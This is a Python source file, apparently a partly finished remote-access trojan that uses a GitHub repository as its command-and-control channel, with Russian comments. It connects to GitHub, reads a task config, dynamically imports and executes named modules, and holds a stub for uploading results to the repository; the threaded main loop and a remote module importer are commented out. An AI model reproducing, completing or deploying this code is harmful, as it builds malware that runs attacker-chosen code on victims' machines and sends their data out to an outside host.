# -*- coding: utf-8 -*-
import json
import base64
import sys
import time
import imp
import random
import threading
import asyncio
import os
from github3 import GitHub
#from github3 import login
 
trojan_id = "abc" #id. пока вручную. потом вынести в конфиги и создавать автоматически

trojan_config = "config/%s.json" % trojan_id
data_path     = "data/%s/" % trojan_id
trojan_modules= []

task_queue    = asyncio.Queue()
configured    = False

#class GitImporter(object):
#    def __init__(self):
#        self.current_module_code = ""
#
#    def find_module(self,fullname,path=None)
#        if configured:
#            print ("[*] Attempting to retrieve %s" % fullname)
#            new_library = ("./modules/%s" % fullname)
#            sys.path.insert(0, new_library)
#
##            if new_library is not None:
##                print(new_library)
##                #self.current_module_code = base64.b64decode(new_library)
##                self.current_module_code = (new_library)
##                print(self.current_module_code)
##                return self
#        return None
#
#    def load_module(self,name):
#        module = imp.new_module(name)
#        exec(self.current_module_code, module.__dict__)
#        #exec (self.current_module_code in module.__dict__)
#        sys.modules[name] = module
#        return module



def connect_to_github():
    print('1')
    gh = GitHub(username="user",password="pass")
    print('2')
    #gh.repository("Deluarh","rat_bh_python")
    repo = gh.repositories("Deluarh", "rat_bh_python")
    repo = gh.repository("Deluarh", "rat_bh_python").branch("master")
    print('3')
    branch = repo #branch("master")
    print(branch)
    return gh,repo,branch

def get_file_contents(filepath):
    gh,repo,branch = connect_to_github()
    print("connert to git")
    tree = branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print ("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config():
    print("запускаем конфиг")
    global configured
    #config_json   = get_file_contents(trojan_config)
    with open(trojan_config, 'r', encoding='utf-8') as fh: #открываем файл на чтение
        config = json.load(fh)
        print(config)
    #config        = json.loads(base64.b64decode(config_json))
        configured    = True
        for task in config:
            print(task['module'])
            print("import %s" % task['module'])
            if task['module'] not in sys.modules:
                new_library = ("./modules/")
                sys.path.insert(0, new_library)
                exec("import %s" % task['module'])
                print("====================")
    return config

def store_module_result(data):
    gh,repo,branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
    #repo.create_file(remote_path,"Commit message",base64.b64encode(data))
    return

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    # store the result in our repo
    store_module_result(result)
    return


# main trojan loop
connect_to_github()
#sys.meta_path = [GitImporter()]
while True:
    if task_queue.empty(): #если очередь пуста
        config = get_trojan_config()
'''
        for task in config:
            print(task)

            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000,10000))
    '''

